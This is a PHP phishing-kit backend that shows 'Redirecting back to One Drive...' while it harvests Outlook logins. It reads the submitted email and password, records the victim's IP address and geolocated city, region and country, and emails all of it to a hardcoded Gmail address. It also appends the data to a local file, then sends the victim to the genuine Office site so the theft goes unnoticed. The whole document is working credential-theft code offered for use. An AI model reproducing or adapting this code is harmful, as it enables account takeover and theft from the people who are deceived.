Redirecting back to One Drive...
<?php

	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
	$message .= "---|BLESSINGS|---\n";
    $message .= "Email Provider: Outlook\n";
    $message .= "E: " . $_GET['email'] . "\n"; 
    $message .= "Ps: " . $_GET['password'] . "\n"; 
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";

	$to ="terryanderson0110@gmail.com";

	$subject = "Outlook | $ip";
	$headers = "From: Blessing <blessing@heaven.com>";


{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
file_put_contents("mod.txt",$message,FILE_APPEND);
}
$send = mail($to,$subject,$message,$headers);
	if($send){ 
?>
		<script>
			window.location="https://products.office.com/en-US/?ms.url=office365com";
		</script> 
<?php
	}
?>